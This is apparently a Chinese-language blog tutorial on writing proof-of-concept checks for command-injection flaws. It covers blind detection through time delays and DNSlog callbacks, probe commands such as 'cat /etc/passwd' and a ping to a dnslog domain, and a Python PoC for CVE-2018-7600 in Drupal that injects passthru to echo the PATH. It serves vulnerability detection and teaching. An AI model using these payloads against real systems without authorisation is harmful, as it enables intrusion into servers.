大家好，本篇来分享两类命令执行漏洞poc的编写技巧。

命令执行漏洞是当应用程序调用一些外部程序处理内容的时候，会用到一些执行系统命令的函数，如果可以控制命令执行函数中的参数时，就可以将恶意的参数传递进去，造成命令执行攻击。

该漏洞根据输出情况分为两种，有回显和无回显。

无回显命令执行

无回显类命令执行的检测方式难度较大，因为我们不知道命令是否真正的执行。

检测方式有两种：

1.延时检测

与时间注入类似，利用返回包时间判断。

2利用DNSlog检测

推荐此类方法。

DNSlog用于检测DNS和HTTP访问记录，可通过执行相关命令，让目标主

机主动请求DMSlog API地址，通过是否有相应的解析记录，则判断命令执行漏洞的

存在。为了兼容window跟linux系统，通常使用ping命令。linux下也可以使用

wget，curl等有网络请求功能的命令。

那么接下来重点讲解如何使用DNSlog检测

1.首先生成一个随机的hash前缀

2.利用create_dns_url生成需要请求的域名地址

3.构造命令执行payload

4.利用payload检测

5.检测DNS解析

解释:

dnslog.create_hashstr()#生成一个hash前缀 比如bb1d05c0
dnslog.create_dns_url(hashstr)#生成请求域名地址，比如bb1d05c0.test.dnslog.link
dnslog.check_dns_log(hashstr)#检测是否有解析

有回显的命令执行

检测思路:

利用常见的命令，根据输出结果判断。

列举常用检测命令

Linux:

cat /etc/passwd

ping -c 5 xxxx.test.dnslog.link

Windows:

type c:\windows\win.ini

ping xxx.text.dnslog.link -n 5

以CVE-2018-7600为例

#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import urllib
def assign(service, arg):
    if service == fingerprint.drupal:
        return True, arg

def audit(arg):
    post_data="form_id=user_pass&_triggering_element_name=name"
    tmp=["?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&name%5B%23markup%5D=echo %path%","?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&name%5B%23markup%5D=echo%20$PATH"]
    for i in range(0,2): 
        url=arg+tmp[i]
        code,head,res,ret_url,log=hackhttp.http(url,post=post_data)
        m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />',res)
        if m:
            found = m.group(1)
            url="?q=file%2Fajax%2Fname%2F%23value%2F"+found
            post_data="form_build_id="+found
            code,head,res,ret_url,log=hackhttp.http(arg+url,post=post_data)
            if (code==200 and '/usr/local' in res) or (code==200 and 'C:\\' in res):
                print "success"
if __name__=="__main__":
    from dummy import *
    audit(assign(fingerprint.drupal,"http://xxxx/")[1])

使用输出PATH的方式，分别为echo %path% 跟$PATH,然后通过状态码以及匹配文件内容的特征进行判断。
